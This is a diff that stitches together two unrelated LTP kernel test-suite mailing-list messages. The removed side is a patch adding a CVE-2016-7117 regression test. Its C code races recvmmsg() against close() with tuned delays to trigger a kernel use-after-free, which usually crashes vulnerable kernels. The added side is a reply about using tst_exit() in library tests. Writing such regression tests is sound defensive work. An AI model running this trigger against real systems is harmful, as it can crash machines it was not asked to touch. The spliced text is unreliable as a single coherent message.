@@ -1,228 +1,188 @@
-From: Richard Palethorpe <rpalethorpe@suse.com>
-Date: Fri, 17 Mar 2017 10:39:11 +0100
-Subject: [LTP] [RFC 1/1] Test for vulnerability cve-2016-7117 in recvmmsg
- error return path
-Message-ID: <20170317103911.1e9e0e25@linux-v3j5>
+From: Cyril Hrubis <chrubis@suse.cz>
+Date: Mon, 20 Mar 2017 10:53:13 +0100
+Subject: [LTP] [PATCH 1/1] lib: use tst_exit() instead of exit()
+In-Reply-To: <20170316112359.8642-1-pvorel@suse.cz>
+References: <20170316112359.8642-1-pvorel@suse.cz>
+Message-ID: <20170320095313.GB2711@rei.lan>
 List-Id: <ltp.lists.linux.it>
 MIME-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
 To: ltp@lists.linux.it
 
-Signed-off-by: Richard Palethorpe <rpalethorpe@suse.com>
----
- testcases/cve/2016-7117/cve-2016-7117.c | 203 ++++++++++++++++++++++++++++++++
- 1 file changed, 203 insertions(+)
- create mode 100644 testcases/cve/2016-7117/cve-2016-7117.c
+Hi!
+> I'm sorry for not important commit. It's more for me to understand whether
+> tst_exit() should be used only for normal tests, or also for lib's tests or
+> even in lib itself.
 
-diff --git a/testcases/cve/2016-7117/cve-2016-7117.c b/testcases/cve/2016-7117/cve-2016-7117.c
-new file mode 100644
-index 000000000..3625d9924
---- /dev/null
-+++ b/testcases/cve/2016-7117/cve-2016-7117.c
-@@ -0,0 +1,203 @@
-+/*
-+ * Copyright (c) 2017 Richard Palethorpe <rpalethorpe@suse.com>
-+ *
-+ * This program is free software: you can redistribute it and/or modify
-+ * it under the terms of the GNU General Public License as published by
-+ * the Free Software Foundation, either version 2 of the License, or
-+ * (at your option) any later version.
-+ *
-+ * This program is distributed in the hope that it will be useful,
-+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
-+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-+ * GNU General Public License for more details.
-+ *
-+ * You should have received a copy of the GNU General Public License
-+ * along with this program. If not, see <http://www.gnu.org/licenses/>.
-+ */
-+/*
-+ * CVE-2016-7117
-+ *
-+ * This tests for a use after free caused by a race between recvmmsg() and
-+ * close(). The exit path for recvmmsg() in (a2e2725541f: net: Introduce
-+ * recvmmsg socket syscall) called fput() on the active file descriptor before
-+ * checking the error state and setting the socket's error field.
-+ *
-+ * If one or more messages are received by recvmmsg() followed by one which
-+ * fails, the socket's error field will be set. If just after recvmmsg() calls
-+ * fput(), a call to close() is made on the same file descriptor there is a
-+ * race between close() releasing the socket object and recvmmsg() setting its
-+ * error field.
-+ *
-+ * fput() does not release a file descriptor's resources (e.g. a socket)
-+ * immediatly, it queues them to be released just before a system call returns
-+ * to user land. So the close() system call must call fput() after it is
-+ * called in recvmmsg(), exit and release the resources all before the socket
-+ * error is set.
-+ *
-+ * Usually if the vulnerability is present the test will be killed with a
-+ * kernel null pointer exception. However this is not guaranteed to happen
-+ * every time. To maximise the chance of the race occuring the test tries to
-+ * align the exit times of the final close() and recvmmsg() plus an offset. It
-+ * takes a moving average and uses it to adjust a delay by nanosleep().
-+ *
-+ * The following was used for reference
-+ * https://blog.lizzie.io/notes-about-cve-2016-7117.html
-+ */
-+
-+#include <sys/wait.h>
-+#include <sys/types.h>
-+#include <sys/socket.h>
-+#include <sys/syscall.h>
-+#include <stdlib.h>
-+#include <errno.h>
-+
-+#include "tst_test.h"
-+#include "tst_safe_net.h"
-+#include "tst_safe_pthread.h"
-+#include "tst_timer.h"
-+
-+// The bug was present in the kernel before recvmmsg was exposed by glibc
-+#ifndef __NR_recvmmsg
-+#ifdef __i386__
-+#define __NR_recvmmsg 337
-+#elif defined(__x86_64__)
-+#define __NR_recvmmsg 299
-+#endif
-+#endif
-+
-+#ifndef CLOCK_MONOTONIC_RAW
-+#define CLOCK_MONOTONIC_RAW CLOCK_MONOTONIC
-+#endif
-+
-+#define MSG "abcdefghijklmnop"
-+#define RECV_TIMEOUT 1
-+#define ATTEMPTS 0x1FFFFF
-+#define TARGET_AVG_TDIFF (-1000.0d)
-+#define ALPHA (0.25d)
-+
-+int socket_fds[2];
-+struct mmsghdr msghdrs[2] = {
-+	{
-+		.msg_hdr = {
-+			.msg_iov = &(struct iovec) {
-+				.iov_len = sizeof(MSG),
-+			},
-+			.msg_iovlen = 1
-+		}
-+	},
-+	{
-+		.msg_hdr = {
-+			.msg_iov = &(struct iovec) {
-+				.iov_base = (void *)(0xbadadd),
-+				.iov_len = ~0,
-+			},
-+			.msg_iovlen = 1
-+		}
-+	}
-+};
-+char rbuf[sizeof(MSG)] = {0};
-+struct timespec timeout = { .tv_sec = RECV_TIMEOUT };
-+struct timespec close_exit;
-+struct timespec recvmmsg_exit;
-+
-+void cleanup(void)
-+{
-+	close(socket_fds[0]);
-+	close(socket_fds[1]);
-+}
-+
-+struct timespec exit_time(void)
-+{
-+	struct timespec t;
-+
-+	clock_gettime(CLOCK_MONOTONIC_RAW, &t);
-+	return t;
-+}
-+
-+void *send_and_close(void *arg)
-+{
-+	struct timespec *delay = (struct timespec *)arg;
-+
-+	send(socket_fds[0], MSG, sizeof(MSG), 0);
-+	send(socket_fds[0], MSG, sizeof(MSG), 0);
-+
-+	nanosleep(delay, 0);
-+
-+	close(socket_fds[0]);
-+	close(socket_fds[1]);
-+	close_exit = exit_time();
-+
-+	return 0;
-+}
-+
-+void run(void)
-+{
-+#ifndef __NR_recvmmsg
-+	tst_brk(TCONF, "No definition for __NR_recvmmsg");
-+#endif
-+	pthread_t pt_send;
-+	int i, stat, too_early_count = 0;
-+	long tdiff = 0, delay = 0;
-+	double avg_tdiff = 0;
-+	struct timespec recv_delay = {0}, clos_delay = {0};
-+
-+	msghdrs[0].msg_hdr.msg_iov->iov_base = (void *)&rbuf;
-+
-+	for (i = 1; i < ATTEMPTS; i++) {
-+		if (socketpair(AF_LOCAL, SOCK_DGRAM, 0, socket_fds))
-+			tst_brk(TBROK | TERRNO, "Socket creation failed");
-+
-+		SAFE_PTHREAD_CREATE(&pt_send, 0, send_and_close, &clos_delay);
-+
-+		nanosleep(&recv_delay, 0);
-+
-+		stat = syscall(__NR_recvmmsg,
-+			       socket_fds[1], msghdrs, 2, 0, &timeout);
-+		recvmmsg_exit = exit_time();
-+		if (stat < 0 && errno == EBADF)
-+			too_early_count++;
-+		else if (stat == 0)
-+			tst_res(TWARN, "No messages received, should be one");
-+		else if (stat < 0)
-+			tst_res(TWARN | TERRNO, "recvmmsg failed unexpectedly");
-+
-+		SAFE_PTHREAD_JOIN(pt_send, 0);
-+
-+		tdiff = recvmmsg_exit.tv_nsec - close_exit.tv_nsec;
-+		avg_tdiff = ALPHA * tdiff + (1.0d - ALPHA) * avg_tdiff;
-+		if (!(i & 0xF)) {
-+			if (avg_tdiff < TARGET_AVG_TDIFF)
-+				delay++;
-+			else if (avg_tdiff > TARGET_AVG_TDIFF)
-+				delay--;
-+
-+			if (delay > 0) {
-+				recv_delay.tv_nsec = delay;
-+				clos_delay.tv_nsec = 1;
-+			} else if (delay < 0) {
-+				recv_delay.tv_nsec = 1;
-+				clos_delay.tv_nsec = -delay;
-+			} else {
-+				recv_delay.tv_nsec = 1;
-+				clos_delay.tv_nsec = 1;
-+			}
-+		}
-+
-+		if (!(i & 0x7FFFF)) {
-+			tst_res(TINFO, "Early: %.1f%%, diff: %ldns, avg_tdiff: %.5gns",
-+				100 * too_early_count / (float)i,
-+				tdiff, avg_tdiff);
-+			tst_res(TINFO, "Receive delay: %ldns, close delay: %ldns",
-+				recv_delay.tv_nsec, clos_delay.tv_nsec);
-+		}
-+	}
-+
-+	tst_res(TPASS, "Nothing happened after %d attempts", ATTEMPTS);
-+}
-+
-+static struct tst_test test = {
-+	.tid = "cve-2016-7117",
-+	.test_all = run,
-+	.cleanup = cleanup,
-+	.min_kver = "2.6.33",
-+};
+The answer here is that we do not care in these cases. The difference
+between exit() and tst_exit() is that tst_exit() exits with correct exit
+value (bitflags stored in the test library) when tst_res() is used to
+report test results. And since the exit value from the code changed
+below is not used the difference is merely cosmetic.
+
+> diff --git a/lib/parse_opts.c b/lib/parse_opts.c
+> index 3a879e44e..1af8e9a6e 100644
+> --- a/lib/parse_opts.c
+> +++ b/lib/parse_opts.c
+> @@ -618,7 +618,7 @@ int main(int argc, char **argv)
+>  
+>  	TEST_CLEANUP;
+>  
+> -	exit(0);
+> +	tst_exit();
+>  }
+
+This is ifdefed out testing code for the parse_opts() function, we
+should rather remove it since it's not compiled by default...
+
+>  #endif /* UNIT_TEST */
+> diff --git a/lib/random_range.c b/lib/random_range.c
+> index 510a4a1ff..c2534e0c7 100644
+> --- a/lib/random_range.c
+> +++ b/lib/random_range.c
+> @@ -706,7 +706,7 @@ char **argv;
+>  			}
+>  		}
+>  	}
+> -	exit(0);
+> +	tst_exit();
+>  }
+>  
+>  #endif /* end if RANDOM_BIT_UNITTEST */
+> @@ -886,7 +886,7 @@ char **argv;
+>  
+>  	}
+>  
+> -	exit(0);
+> +	tst_exit();
+>  }
+
+This is the same case.
+
+>  #endif
+> diff --git a/lib/tests/tst_checkpoint.c b/lib/tests/tst_checkpoint.c
+> index 2cb17a5f7..7008171db 100644
+> --- a/lib/tests/tst_checkpoint.c
+> +++ b/lib/tests/tst_checkpoint.c
+> @@ -55,5 +55,5 @@ int main(void)
+>  
+>  	wait(NULL);
+>  	tst_rmdir();
+> -	return 0;
+> +	tst_exit();
+>  }
+> diff --git a/lib/tests/tst_checkpoint_wait_timeout.c b/lib/tests/tst_checkpoint_wait_timeout.c
+> index c5fae670e..eb69565c2 100644
+> --- a/lib/tests/tst_checkpoint_wait_timeout.c
+> +++ b/lib/tests/tst_checkpoint_wait_timeout.c
+> @@ -54,5 +54,5 @@ int main(void)
+>  	break;
+>  	}
+>  
+> -	return 0;
+> +	tst_exit();
+>  }
+> diff --git a/lib/tests/tst_checkpoint_wake_timeout.c b/lib/tests/tst_checkpoint_wake_timeout.c
+> index 8af1feb18..6a71d80b6 100644
+> --- a/lib/tests/tst_checkpoint_wake_timeout.c
+> +++ b/lib/tests/tst_checkpoint_wake_timeout.c
+> @@ -37,5 +37,5 @@ int main(void)
+>  	TST_SAFE_CHECKPOINT_WAKE(tst_rmdir, 0);
+>  	fprintf(stderr, "Parent: checkpoint reached\n");
+>  
+> -	return 0;
+> +	tst_exit();
+>  }
+> diff --git a/lib/tests/tst_cleanup_once.c b/lib/tests/tst_cleanup_once.c
+> index 328ed7492..73ac88db1 100644
+> --- a/lib/tests/tst_cleanup_once.c
+> +++ b/lib/tests/tst_cleanup_once.c
+> @@ -43,5 +43,5 @@ int main(void)
+>  	cleanup();
+>  	cleanup();
+>  
+> -	return 0;
+> +	tst_exit();
+>  }
+> diff --git a/lib/tests/tst_dataroot01.c b/lib/tests/tst_dataroot01.c
+> index fab8bfea2..e4d8a3875 100644
+> --- a/lib/tests/tst_dataroot01.c
+> +++ b/lib/tests/tst_dataroot01.c
+> @@ -51,4 +51,3 @@ int main(void)
+>  
+>  	tst_exit();
+>  }
+> -
+> diff --git a/lib/tests/tst_process_state.c b/lib/tests/tst_process_state.c
+> index dd4f0535d..33b87c569 100644
+> --- a/lib/tests/tst_process_state.c
+> +++ b/lib/tests/tst_process_state.c
+> @@ -59,7 +59,7 @@ int main(void)
+>  
+>  		fprintf(stderr, "Child woken up\n");
+>  
+> -		return 0;
+> +		tst_exit();
+>  		break;
+>  	default:
+>  		/* Wait for child to sleep */
+> @@ -71,5 +71,5 @@ int main(void)
+>  	}
+>  
+>  	wait(NULL);
+> -	return 0;
+> +	tst_exit();
+>  }
+> diff --git a/lib/tests/tst_safe_macros.c b/lib/tests/tst_safe_macros.c
+> index b5809f40d..6a417eff5 100644
+> --- a/lib/tests/tst_safe_macros.c
+> +++ b/lib/tests/tst_safe_macros.c
+> @@ -36,5 +36,5 @@ int main(int argc LTP_ATTRIBUTE_UNUSED, char **argv)
+>  	SAFE_WRITE(NULL, 1, fd, buf, 9);
+>  	SAFE_PIPE(NULL, fds);
+>  
+> -	return 0;
+> +	tst_exit();
+>  }
+> diff --git a/lib/tests/tst_strerrno.c b/lib/tests/tst_strerrno.c
+> index dbee7642f..e9ad39cfd 100644
+> --- a/lib/tests/tst_strerrno.c
+> +++ b/lib/tests/tst_strerrno.c
+> @@ -31,5 +31,5 @@ int main(void)
+>  {
+>  	fprintf(stderr, "0 = %s\n", tst_strerrno(0));
+>  	fprintf(stderr, "EINVAL = %s\n", tst_strerrno(EINVAL));
+> -	return 0;
+> +	tst_exit();
+>  }
+> diff --git a/lib/tests/tst_strsig.c b/lib/tests/tst_strsig.c
+> index 9a5ca80aa..d0b2184f2 100644
+> --- a/lib/tests/tst_strsig.c
+> +++ b/lib/tests/tst_strsig.c
+> @@ -31,5 +31,5 @@ int main(void)
+>  {
+>  	fprintf(stderr, "SIGKILL = %s\n", tst_strsig(SIGKILL));
+>  	fprintf(stderr, "SIGALRM = %s\n", tst_strsig(SIGALRM));
+> -	return 0;
+> +	tst_exit();
+>  }
+> diff --git a/lib/tests/tst_tmpdir_test.c b/lib/tests/tst_tmpdir_test.c
+> index f394893a4..f58afc26a 100644
+> --- a/lib/tests/tst_tmpdir_test.c
+> +++ b/lib/tests/tst_tmpdir_test.c
+> @@ -80,5 +80,5 @@ int main(void)
+>  	else
+>  		printf("Test completed successfully!\n");
+>  
+> -	return 0;
+> +	tst_exit();
+>  }
+
+We can apply these since we should be using tst_exit() there, but in
+practice it does not matter, since we are not executing these in LTP run
+and hence the test exit value is not used at all.
+
 -- 
-2.12.0
+Cyril Hrubis
+chrubis@suse.cz
